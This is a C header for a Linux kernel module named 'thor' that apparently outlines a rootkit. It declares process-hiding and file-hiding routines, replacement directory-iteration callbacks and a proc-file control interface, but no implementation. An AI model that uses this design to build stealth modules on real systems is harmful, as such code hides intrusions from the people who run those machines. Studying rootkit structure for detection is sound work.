#ifndef THOR_H_
#define THOR_H_

#include <linux/fs.h>
#include <linux/init.h>
#include <linux/proc_fs.h>

// -------------------------------------------------- MACROS
#define MIN(a,b) \
   ({ typeof (a) _a = (a); \
      typeof (b) _b = (b); \
     _a < _b ? _a : _b; })

#define THOR_PROCFILE "thor"

// ------------------------------------------------------------ DEFINITIONS
struct _pid_list {
    char *name;
    struct list_head list;
};

struct _file_list {
    char *name;
    struct list_head list;
};

// ------------------------------------------------------------ PROTOTYPES
static int __init thor_init(void);

static int __init procfile_init(void);

static int __init prochidder_init(void);

static int __init filehidder_init(void);

static void prochidder_cleanup(void);

static void filehidder_cleanup(void);

static void __exit thor_exit(void);

static void thor_cleanup(void);

static int procfile_open(struct inode *inode, struct file *file);

static int procfile_read(struct seq_file *m, void *v);

static ssize_t procfile_write(struct file *file, const char __user *buffer,
        size_t count, loff_t *ppos);

static void procfile_cleanup(void);

static int thor_proc_iterate(struct file *file, struct dir_context *ctx);

static int thor_proc_filldir(void *buf, const char *name, int namelen,
        loff_t offset, u64 ino, unsigned d_type);

static int thor_fs_iterate(struct file *file, struct dir_context *ctx);

static int thor_fs_filldir(void *buf, const char *name, int namelen,
        loff_t offset, u64 ino, unsigned d_type);

static void add_to_pid_list(const char *name, unsigned int len);

static void remove_from_pid_list(const char *name, unsigned int len);

static void clear_pid_list(void);

static void add_to_file_list(const char *name, unsigned int len);

static void remove_from_file_list(const char *name, unsigned int len);

static void clear_file_list(void);

#endif
